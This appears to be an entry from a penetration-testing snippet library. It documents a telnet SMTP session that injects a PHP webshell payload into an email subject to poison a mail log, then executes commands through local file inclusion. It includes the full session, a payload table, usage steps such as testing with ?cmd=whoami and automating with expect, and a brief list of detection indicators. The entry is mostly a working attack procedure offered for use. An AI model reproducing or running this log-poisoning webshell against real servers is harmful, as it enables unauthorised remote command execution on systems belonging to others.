---
id: be170b04-7f00-4bbd-9182-7ec4a97c1339
name: telnet-smtp-session-for-php-injection
type: code
language: bash
verified: true
created_at: '2023-04-06T03:55:58.606999+00:00'
updated_at: '2023-10-10T20:22:15.238045+00:00'
platforms:
  - Linux
tags:
  - smtp
  - injection
  - rce
validated: true
---

# telnet-smtp-session-for-php-injection

## Code

```bash
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

## Description

This code snippet captures a full telnet session to an SMTP server, injecting PHP code into the email subject to poison the mail log file. When the log is included via LFI, the PHP executes as a webshell, allowing command execution via URL parameters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.10.10.10 | Target SMTP server IP | 192.168.1.100 |
| mail@example.com | Spoofed sender email | attacker@domain.com |
| root | Recipient username | www-data |
| <?php echo system($_GET["cmd"]); ?> | PHP payload for RCE | <?php system($_GET['cmd']); ?> |

## Usage

Run this interactive session from a Kali Linux terminal to inject the payload. After completion, access the LFI endpoint with ?cmd=whoami to test execution. Ideal for scenarios with open relays and LFI vulns; automate with expect scripts for non-interactive use.

## Detection

- SMTP logs showing anomalous subjects with PHP tags.
- Web server access logs with /var/log/mail inclusions.
- WAF alerts on PHP code in email traffic or LFI patterns.
- File integrity monitoring on log files for unexpected content.

## Related

- [[procedures/LFI-to-RCE-via-Mail-Log-File-Inclusion]]
- [[commands/telnet-smtp-php-injection]]
